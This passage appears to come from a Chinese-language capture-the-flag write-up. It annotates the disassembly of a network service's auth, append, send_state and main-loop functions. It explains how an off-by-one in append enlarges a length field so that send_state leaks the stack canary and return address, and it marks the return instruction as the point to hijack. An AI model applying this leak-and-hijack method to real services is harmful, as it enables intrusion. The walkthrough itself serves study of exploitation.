\NormalTok{16b6..16ff: magic }\OperatorTok{=} \OperatorTok{(}\NormalTok{payload}\OperatorTok{[}\DecValTok{1}\OperatorTok{]\textless{}\textless{}}\DecValTok{24}\OperatorTok{)|(}\NormalTok{payload}\OperatorTok{[}\DecValTok{2}\OperatorTok{]\textless{}\textless{}}\DecValTok{16}\OperatorTok{)|(}\NormalTok{payload}\OperatorTok{[}\DecValTok{3}\OperatorTok{]\textless{}\textless{}}\DecValTok{8}\OperatorTok{)|}\NormalTok{payload}\OperatorTok{[}\DecValTok{4}\OperatorTok{]}
\NormalTok{             （= 大端序 4 bytes）→ }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0xc}\OperatorTok{]}
\NormalTok{1702: 8b 45 f4               mov    }\KeywordTok{eax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0xc}\OperatorTok{]}
\NormalTok{1705: 89 c7                  mov    }\KeywordTok{edi}\OperatorTok{,}\KeywordTok{eax}
\NormalTok{1707: e8 }\DecValTok{7}\BaseNTok{d}\NormalTok{ fb ff ff         call   }\DecValTok{1289}                  \CommentTok{; validate(magic)}
\NormalTok{170c: 85 c0                  test   }\KeywordTok{eax}\OperatorTok{,}\KeywordTok{eax}
\NormalTok{170e: 74 07                  }\ControlFlowTok{je}     \DecValTok{1717}
\NormalTok{1710: b8 e5 ff ff ff         mov    }\KeywordTok{eax}\OperatorTok{,}\BaseNTok{0xffffffe5}        \CommentTok{; {-}27（鑰匙卡錯）}
\NormalTok{1715: eb }\FloatTok{1}\BaseNTok{f}\NormalTok{                  jmp    }\DecValTok{1736}
\NormalTok{1717: 48 8b 45 e8            mov    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x18}\OperatorTok{]}        \CommentTok{; state}
\NormalTok{171b: 66 c7 }\DecValTok{80} \DecValTok{00} \DecValTok{01} \DecValTok{00} \DecValTok{00} \DecValTok{00} \DecValTok{01}\NormalTok{   mov }\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rax}\OperatorTok{+}\BaseNTok{0x100}\OperatorTok{],}\BaseNTok{0x100}  \CommentTok{; ✶ capacity = 0x100}
\NormalTok{1724: 48 8b 45 e8            mov    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x18}\OperatorTok{]}
\NormalTok{1728: 66 c7 }\DecValTok{80} \DecValTok{02} \DecValTok{01} \DecValTok{00} \DecValTok{00} \DecValTok{01} \DecValTok{00}\NormalTok{   mov }\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rax}\OperatorTok{+}\BaseNTok{0x102}\OperatorTok{],}\BaseNTok{0x1}    \CommentTok{; counter = 1}
\NormalTok{1731: b8 }\DecValTok{00} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{         mov    }\KeywordTok{eax}\OperatorTok{,}\BaseNTok{0x0}               \CommentTok{; 成功}
\end{Highlighting}
\end{Shaded}

客戶端必須送：\texttt{opcode=1} + \texttt{13\ \allowbreak{}37\ \allowbreak{}c3\ \allowbreak{}5f}（魔數大端序）→
5 bytes。成功後伺服器回 status \texttt{0}。

\paragraph{\texorpdfstring{4.8 \texttt{append} @ \texttt{0x174c} ------
\textbf{漏洞就在這 8 行}（opcode
2）}{4.8 append @ 0x174c ------ 漏洞就在這 8 行（opcode 2）}}\label{append-0x174c-ux6f0fux6d1eux5c31ux5728ux9019-8-ux884copcode-2}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{174c: f3 }\FloatTok{0}\BaseNTok{f} \DecValTok{1}\ErrorTok{e}\NormalTok{ fa            endbr64}
\NormalTok{1750: 55                     }\BuiltInTok{push}   \KeywordTok{rbp}
\NormalTok{1751: 48 89 e5               mov    }\KeywordTok{rbp}\OperatorTok{,}\KeywordTok{rsp}
\NormalTok{1754: 48 83 ec }\DecValTok{40}\NormalTok{            sub    }\KeywordTok{rsp}\OperatorTok{,}\BaseNTok{0x40}
\NormalTok{1758: 48 89 7d d8            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x28}\OperatorTok{],}\KeywordTok{rdi}        \CommentTok{; state}
\NormalTok{175c: 48 89 75 d0            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x30}\OperatorTok{],}\KeywordTok{rsi}        \CommentTok{; payload}
\NormalTok{1760: 89 d0                  mov    }\KeywordTok{eax}\OperatorTok{,}\KeywordTok{edx}
\NormalTok{1762: 66 89 45 cc            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x34}\OperatorTok{],}\KeywordTok{ax}         \CommentTok{; len}
\NormalTok{1766: 64 48 8b 04 25 28 00 00 00  }\BuiltInTok{mov} \KeywordTok{rax}\OperatorTok{,}\DataTypeTok{QWORD} \DataTypeTok{PTR} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}
\NormalTok{176f: 48 89 45 f8            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x8}\OperatorTok{],}\KeywordTok{rax}         \CommentTok{; 本函式自己的金絲雀}
\NormalTok{1775: 0f b7 }\DecValTok{45}\NormalTok{ cc            movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x34}\OperatorTok{]} \CommentTok{; len}
\NormalTok{1779: 83 e8 }\DecValTok{01}\NormalTok{               sub    }\KeywordTok{eax}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{177c: 66 89 45 ee            mov    }\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x12}\OperatorTok{],}\KeywordTok{ax} \CommentTok{; n = len {-} 1}
\NormalTok{1780: 48 8b 45 d0            mov    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x30}\OperatorTok{]}        \CommentTok{; payload}
\NormalTok{1784: 48 83 c0 }\DecValTok{01}\NormalTok{            add    }\KeywordTok{rax}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{1788: 48 89 45 f0            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x10}\OperatorTok{],}\KeywordTok{rax}        \CommentTok{; src = payload + 1（跳過 opcode）}
\NormalTok{178c: 48 8b 45 d8            mov    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x28}\OperatorTok{]}        \CommentTok{; state}
\NormalTok{1790: 0f b7 }\DecValTok{80} \DecValTok{00} \DecValTok{01} \DecValTok{00} \DecValTok{00}\NormalTok{   movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rax}\OperatorTok{+}\BaseNTok{0x100}\OperatorTok{]} \CommentTok{; capacity}
\NormalTok{1797: 66 39 45 ee            cmp    }\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x12}\OperatorTok{],}\KeywordTok{ax} \CommentTok{; n \textless{}= capacity ?}
\NormalTok{179b: 76 07                  }\ControlFlowTok{jbe}    \DecValTok{17}\ErrorTok{a4}                  \CommentTok{; 是 → 通過}
\NormalTok{179d: b8 e2 ff ff ff         mov    }\KeywordTok{eax}\OperatorTok{,}\BaseNTok{0xffffffe2}        \CommentTok{; {-}30（太長）}
\NormalTok{17a2: eb }\DecValTok{56}\NormalTok{                  jmp    }\DecValTok{17}\ErrorTok{fa}
\NormalTok{17a4: 66 c7 }\DecValTok{45}\NormalTok{ ec }\DecValTok{00} \DecValTok{00}\NormalTok{      mov    }\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x14}\OperatorTok{],}\BaseNTok{0x0} \CommentTok{; i = 0}
\NormalTok{17aa: eb }\DecValTok{26}\NormalTok{                  jmp    }\DecValTok{17}\BaseNTok{d}\ErrorTok{2}
\NormalTok{17ac: 0f b7 }\DecValTok{55}\NormalTok{ ec            movzx  }\KeywordTok{edx}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x14}\OperatorTok{]} \CommentTok{; i}
\NormalTok{17b0: 48 8b 45 f0            mov    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x10}\OperatorTok{]}        \CommentTok{; src}
\NormalTok{17b4: 48 01 c2               add    }\KeywordTok{rdx}\OperatorTok{,}\KeywordTok{rax}               \CommentTok{; src + i}
\NormalTok{17b7: 0f b7 }\DecValTok{45}\NormalTok{ ec            movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x14}\OperatorTok{]}
\NormalTok{17bb: 0f b6 }\DecValTok{0}\ErrorTok{a}\NormalTok{               movzx  }\KeywordTok{ecx}\OperatorTok{,}\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rdx}\OperatorTok{]}    \CommentTok{; cl = src[i]}
\NormalTok{17be: 48 8b 55 d8            mov    }\KeywordTok{rdx}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x28}\OperatorTok{]}        \CommentTok{; state}
\NormalTok{17c2: 48 98                  }\BuiltInTok{cdqe}
\NormalTok{17c4: 88 0c 02               }\BuiltInTok{mov}    \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rdx}\OperatorTok{+}\KeywordTok{rax}\OperatorTok{*}\DecValTok{1}\OperatorTok{],}\KeywordTok{cl} \CommentTok{; ✶ state[i] = src[i]}
\NormalTok{17c7: 0f b7 }\DecValTok{45}\NormalTok{ ec            movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x14}\OperatorTok{]}
\NormalTok{17cb: 83 c0 }\DecValTok{01}\NormalTok{               add    }\KeywordTok{eax}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{17ce: 66 89 45 ec            mov    }\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x14}\OperatorTok{],}\KeywordTok{ax} \CommentTok{; i++}
\NormalTok{17d2: 0f b7 }\DecValTok{45}\NormalTok{ ec            movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x14}\OperatorTok{]}
\NormalTok{17d6: 66 3b 45 ee            cmp    }\KeywordTok{ax}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x12}\OperatorTok{]} \CommentTok{; ✶ i \textless{}= n ?}
\NormalTok{17da: 76 d0                  jbe    }\DecValTok{17}\ErrorTok{ac}                  \CommentTok{; ✶ jbe → 含等於}
\end{Highlighting}
\end{Shaded}

\paragraph{\texorpdfstring{4.9 \texttt{send\_\allowbreak{}state} @ \texttt{0x1810}
------ \textbf{洩漏原語}（opcode
3）}{4.9 send\_state @ 0x1810 ------ 洩漏原語（opcode 3）}}\label{send_state-0x1810-ux6d29ux6f0fux539fux8a9eopcode-3}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{1810: f3 }\FloatTok{0}\BaseNTok{f} \DecValTok{1}\ErrorTok{e}\NormalTok{ fa            endbr64}
\NormalTok{1814: 55                     }\BuiltInTok{push}   \KeywordTok{rbp}
\NormalTok{1815: 48 89 e5               mov    }\KeywordTok{rbp}\OperatorTok{,}\KeywordTok{rsp}
\NormalTok{1818: 48 83 ec }\DecValTok{20}\NormalTok{            sub    }\KeywordTok{rsp}\OperatorTok{,}\BaseNTok{0x20}
\NormalTok{181c: 48 89 7d e8            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x18}\OperatorTok{],}\KeywordTok{rdi}        \CommentTok{; state}
\NormalTok{1820: 64 48 8b 04 25 28 00 00 00  }\BuiltInTok{mov} \KeywordTok{rax}\OperatorTok{,}\DataTypeTok{QWORD} \DataTypeTok{PTR} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}
\NormalTok{1829: 48 89 45 f8            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x8}\OperatorTok{],}\KeywordTok{rax}
\NormalTok{182f: 48 8b 45 e8            mov    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x18}\OperatorTok{]}
\NormalTok{1833: 0f b7 }\DecValTok{80} \DecValTok{00} \DecValTok{01} \DecValTok{00} \DecValTok{00}\NormalTok{   movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rax}\OperatorTok{+}\BaseNTok{0x100}\OperatorTok{]} \CommentTok{; ✶ capacity}
\NormalTok{183a: 0f b7 d0               movzx  }\KeywordTok{edx}\OperatorTok{,}\KeywordTok{ax}
\NormalTok{183d: 48 8b 45 e8            mov    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x18}\OperatorTok{]}
\NormalTok{1841: 48 89 c6               mov    }\KeywordTok{rsi}\OperatorTok{,}\KeywordTok{rax}               \CommentTok{; 參數2 = data = state}
\NormalTok{1844: bf }\DecValTok{00} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{         mov    }\KeywordTok{edi}\OperatorTok{,}\BaseNTok{0x0}               \CommentTok{; 參數1 = status = 0}
\NormalTok{1849: e8 }\DecValTok{54}\NormalTok{ fb ff ff         call   }\DecValTok{13}\ErrorTok{a2}                 \CommentTok{; send\_frame(0, state, capacity)}
\end{Highlighting}
\end{Shaded}

\texttt{capacity} 是 \texttt{state{[}0x100{]}}。正常是
\texttt{0x100}，只會洩漏緩衝區自己； 一旦被 off-by-one 改成
\texttt{0x1ff}，\textbf{就會把緩衝區後面 255 bytes 的堆疊（金絲雀、saved
rbp、回傳位址）一起送出}。

\paragraph{\texorpdfstring{4.10 \texttt{service\_\allowbreak{}loop} @
\texttt{0x1865}（主迴圈）--- 區域變數與 \texttt{state}
的位置}{4.10 service\_loop @ 0x1865（主迴圈）--- 區域變數與 state 的位置}}\label{service_loop-0x1865ux4e3bux8ff4ux5708-ux5340ux57dfux8b8aux6578ux8207-state-ux7684ux4f4dux7f6e}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{1865: f3 }\FloatTok{0}\BaseNTok{f} \DecValTok{1}\ErrorTok{e}\NormalTok{ fa            endbr64}
\NormalTok{1869: 55                     }\BuiltInTok{push}   \KeywordTok{rbp}
\NormalTok{186a: 48 89 e5               mov    }\KeywordTok{rbp}\OperatorTok{,}\KeywordTok{rsp}
\NormalTok{186d: 48 81 ec }\DecValTok{20} \DecValTok{01} \DecValTok{00} \DecValTok{00}\NormalTok{   sub    }\KeywordTok{rsp}\OperatorTok{,}\BaseNTok{0x120}                \CommentTok{; 開 0x120 bytes}
\NormalTok{1874: 64 48 8b 04 25 28 00 00 00  }\BuiltInTok{mov} \KeywordTok{rax}\OperatorTok{,}\DataTypeTok{QWORD} \DataTypeTok{PTR} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}
\NormalTok{187d: 48 89 45 f8            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x8}\OperatorTok{],}\KeywordTok{rax}            \CommentTok{; 金絲雀 @ rbp{-}8}
\NormalTok{1883: c7 }\DecValTok{85}\NormalTok{ e4 fe ff ff }\DecValTok{00} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  mov }\DataTypeTok{DWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x11c}\OperatorTok{],}\BaseNTok{0x0}  \CommentTok{; authed = 0}
\NormalTok{188d: 66 c7 }\DecValTok{45}\NormalTok{ f0 }\DecValTok{00} \DecValTok{00}\NormalTok{      mov    }\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x10}\OperatorTok{],}\BaseNTok{0x0}   \CommentTok{; state[0x100]=capacity=0}
\NormalTok{1893: 66 c7 }\DecValTok{45}\NormalTok{ f2 }\DecValTok{00} \DecValTok{00}\NormalTok{      mov    }\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0xe}\OperatorTok{],}\BaseNTok{0x0}    \CommentTok{; state[0x102]=counter=0}
\NormalTok{1899: c7 }\DecValTok{45}\NormalTok{ f4 }\DecValTok{00} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{   mov    }\DataTypeTok{DWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0xc}\OperatorTok{],}\BaseNTok{0x0}
\NormalTok{18a0: ba }\DecValTok{95} \DecValTok{01} \DecValTok{00} \DecValTok{00}\NormalTok{         mov    }\KeywordTok{edx}\OperatorTok{,}\BaseNTok{0x195}
\NormalTok{18a5: 48 8d 05 74 07 00 00   }\BuiltInTok{lea}    \KeywordTok{rax}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x774}\OperatorTok{]}           \CommentTok{; .rodata:0x2020（ASCII 橫幅）}
\NormalTok{18af: bf }\DecValTok{01} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{         mov    }\KeywordTok{edi}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{18b4: e8 e7 f7 ff ff         call   }\DecValTok{10}\ErrorTok{a0} \OperatorTok{\textless{}}\NormalTok{write}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt}\OperatorTok{\textgreater{}}          \CommentTok{; write(1, banner, 0x195)}
\NormalTok{18b9: c6 }\DecValTok{85}\NormalTok{ e0 fe ff ff e1   mov    }\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x120}\OperatorTok{],}\BaseNTok{0xe1} \CommentTok{; err = 0xe1}
\NormalTok{18c0: 48 8d 95 e0 fe ff ff   lea    }\KeywordTok{rdx}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x120}\OperatorTok{]}           \CommentTok{; \&err}
\NormalTok{18c7: 48 8d 85 e2 fe ff ff   lea    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x11e}\OperatorTok{]}           \CommentTok{; \&len}
\NormalTok{18ce: 48 89 c6               mov    }\KeywordTok{rsi}\OperatorTok{,}\KeywordTok{rax}
\NormalTok{18d1: 48 8d 05 88 2f 00 00   }\BuiltInTok{lea}    \KeywordTok{rax}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x2f88}\OperatorTok{]}          \CommentTok{; 4860 = rxbuf}
\NormalTok{18db: e8 ec fb ff ff         call   }\DecValTok{14}\ErrorTok{cc}                      \CommentTok{; recv\_frame(rxbuf,\&len,\&err)}
\NormalTok{18e0: 85 c0                  test   }\KeywordTok{eax}\OperatorTok{,}\KeywordTok{eax}
\NormalTok{18e2: 79 20                  }\ControlFlowTok{jns}    \DecValTok{1904}                      \CommentTok{; 成功 → 處理}
\NormalTok{18e4..18fa: send\_frame}\OperatorTok{(}\NormalTok{err}\OperatorTok{,}\DecValTok{0}\OperatorTok{,}\DecValTok{0}\OperatorTok{)}\NormalTok{ 後離開迴圈（回報錯誤）}
\NormalTok{1904: 48 8d 05 59 2f 00 00   }\BuiltInTok{lea}    \KeywordTok{rax}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x2f59}\OperatorTok{]}          \CommentTok{; 4864 = rxbuf+4 = payload}
\NormalTok{190b: 48 89 85 e8 fe ff ff   mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x118}\OperatorTok{],}\KeywordTok{rax}           \CommentTok{; payload 指標存起來}
\NormalTok{1912: 48 8b 85 e8 fe ff ff   mov    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x118}\OperatorTok{]}
\NormalTok{1919: 0f b6 }\DecValTok{00}\NormalTok{               movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rax}\OperatorTok{]}        \CommentTok{; opcode = payload[0]}
\NormalTok{191c: 3c 01                  }\BuiltInTok{cmp}    \KeywordTok{al}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{191e: 74 22                  }\ControlFlowTok{je}     \DecValTok{1942}                      \CommentTok{; opcode 1 免登入}
\NormalTok{1920: 83 bd e4 fe ff ff }\DecValTok{00}\NormalTok{   cmp    }\DataTypeTok{DWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x11c}\OperatorTok{],}\BaseNTok{0x0} \CommentTok{; 已登入？}
\NormalTok{1927: 75 19                  }\ControlFlowTok{jne}    \DecValTok{1942}
\NormalTok{1929..1938: send\_frame}\OperatorTok{(}\BaseNTok{0xe6}\OperatorTok{,}\DecValTok{0}\OperatorTok{,}\DecValTok{0}\OperatorTok{)}\NormalTok{（未登入）}
\NormalTok{1942: 48 8b 85 e8 fe ff ff   mov    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x118}\OperatorTok{]}
\NormalTok{1949: 0f b6 }\DecValTok{00}\NormalTok{               movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rax}\OperatorTok{]}
\NormalTok{194f: 83 f8 }\DecValTok{05}\NormalTok{               cmp    }\KeywordTok{eax}\OperatorTok{,}\BaseNTok{0x5}
\NormalTok{1952: 0f 87 f7 }\DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{      ja     }\DecValTok{1}\ErrorTok{a4f}                      \CommentTok{; \textgreater{}5 → 0xe7}
\NormalTok{1958..1978: }\ControlFlowTok{jmp} \OperatorTok{[}\BaseNTok{0x21c8} \OperatorTok{+}\NormalTok{ opcode}\OperatorTok{*}\DecValTok{4}\OperatorTok{]}\NormalTok{（jump table，見 §}\FloatTok{2.2}\NormalTok{）}

\CommentTok{;; opcode 1（AUTH）@ 197b}
\NormalTok{197b: 0f b7 }\DecValTok{85}\NormalTok{ e2 fe ff ff   movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x11e}\OperatorTok{]} \CommentTok{; len}
\NormalTok{1982: 0f b7 d0               movzx  }\KeywordTok{edx}\OperatorTok{,}\KeywordTok{ax}
\NormalTok{1985: 48 8b 8d e8 fe ff ff   mov    }\KeywordTok{rcx}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x118}\OperatorTok{]}           \CommentTok{; payload}
\NormalTok{198c: 48 8d 85 f0 fe ff ff   lea    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x110}\OperatorTok{]}           \CommentTok{; ✶ state 基底}
\NormalTok{1993: 48 89 ce               mov    }\KeywordTok{rsi}\OperatorTok{,}\KeywordTok{rcx}
\NormalTok{1996: 48 89 c7               mov    }\KeywordTok{rdi}\OperatorTok{,}\KeywordTok{rax}
\NormalTok{1999: e8 de fc ff ff         call   }\DecValTok{167}\ErrorTok{c}                      \CommentTok{; auth(state,payload,len)}
\NormalTok{199e: 88 85 e1 fe ff ff      mov    }\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x11f}\OperatorTok{],}\KeywordTok{al}   \CommentTok{; 存回傳值}
\NormalTok{19a4: 80 bd e1 fe ff ff }\DecValTok{00}\NormalTok{   cmp    }\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x11f}\OperatorTok{],}\BaseNTok{0x0}
\NormalTok{19ab: 75 0a                  }\ControlFlowTok{jne}    \DecValTok{19}\ErrorTok{b7}
\NormalTok{19ad: c7 }\DecValTok{85}\NormalTok{ e4 fe ff ff }\DecValTok{01} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  mov }\DataTypeTok{DWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x11c}\OperatorTok{],}\BaseNTok{0x1}   \CommentTok{; authed = 1}
\NormalTok{19b7..19ca: send\_frame}\OperatorTok{(}\KeywordTok{al}\OperatorTok{,} \DecValTok{0}\OperatorTok{,} \DecValTok{0}\OperatorTok{)}

\CommentTok{;; opcode 2（APPEND）@ 19d4}
\NormalTok{19d4: }\BuiltInTok{movzx} \KeywordTok{eax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x11e}\OperatorTok{]}\CommentTok{; movzx edx,ax; mov rcx,[rbp{-}0x118]}
\NormalTok{19e5: 48 8d 85 f0 fe ff ff   lea    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x110}\OperatorTok{]}           \CommentTok{; state}
\NormalTok{19f2: e8 }\DecValTok{55}\NormalTok{ fd ff ff         call   }\DecValTok{174}\ErrorTok{c}                      \CommentTok{; append(state,payload,len)}
\NormalTok{19f7..1a06: send\_frame}\OperatorTok{(}\NormalTok{回傳值}\OperatorTok{,} \DecValTok{0}\OperatorTok{,} \DecValTok{0}\OperatorTok{)}

\CommentTok{;; opcode 3（SEND STATE）@ 1a0d}
\NormalTok{1a0d: 48 8d 85 f0 fe ff ff   lea    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x110}\OperatorTok{]}
\NormalTok{1a17: e8 f4 fd ff ff         call   }\DecValTok{1810}                      \CommentTok{; send\_state(state)}

\CommentTok{;; opcode 4（EJECT）@ 1a39 → 離開迴圈}
\NormalTok{1a39..1a48: send\_frame}\OperatorTok{(}\DecValTok{0}\OperatorTok{,}\DecValTok{0}\OperatorTok{,}\DecValTok{0}\OperatorTok{)}
\NormalTok{1a4d: eb }\DecValTok{1}\ErrorTok{a}\NormalTok{                  jmp    }\DecValTok{1}\ErrorTok{a69}                      \CommentTok{; → epilogue}

\CommentTok{;; opcode 5（ECHO）@ 1a1e}
\NormalTok{1a1e: e8 af f8 ff ff         call   }\DecValTok{12}\BaseNTok{d}\ErrorTok{2}                      \CommentTok{; system("/bin/echo {-}n \textquotesingle{}\textquotesingle{}")}
\NormalTok{1a23..1a32: send\_frame}\OperatorTok{(}\DecValTok{0}\OperatorTok{,}\DecValTok{0}\OperatorTok{,}\DecValTok{0}\OperatorTok{)}

\CommentTok{;; epilogue @ 1a69}
\NormalTok{1a69: 48 8b 45 f8            mov    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x8}\OperatorTok{]}             \CommentTok{; 金絲雀}
\NormalTok{1a6d: 64 48 2b 04 25 28 00 00 00  }\BuiltInTok{sub} \KeywordTok{rax}\OperatorTok{,}\DataTypeTok{QWORD} \DataTypeTok{PTR} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}
\NormalTok{1a76: 74 05                  }\ControlFlowTok{je}     \DecValTok{1}\ErrorTok{a7d}
\NormalTok{1a78: e8 }\DecValTok{33}\NormalTok{ f6 ff ff         call   }\BaseNTok{10b}\ErrorTok{0} \OperatorTok{\textless{}}\NormalTok{\_\_stack\_chk\_fail}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt}\OperatorTok{\textgreater{}}
\NormalTok{1a7d: c9                     leave}
\NormalTok{1a7e: c3                     ret                            }\CommentTok{; ✶✶ 我們劫持這裡}
\end{Highlighting}
\end{Shaded}

\begin{quote}
※注意 上面 \texttt{mov\ \allowbreak{}rax,\allowbreak{}QWORD\ \allowbreak{}PTR\ \allowbreak{}fs:\allowbreak{}0x28} 是 \textbf{9
bytes}，\texttt{objdump} 會把它拆成兩行印 （第二行只印尾巴的
\texttt{00\ \allowbreak{}00}，並標上 \texttt{1a74:}）。所以\textbf{下一條指令的位址是
\texttt{0x1a76}，不是 \texttt{0x1a74}} ------ 想下中斷點請用
\texttt{b\ \allowbreak{}*0x1a76}（\texttt{0x1a74} 會落在指令中間）。自己驗：
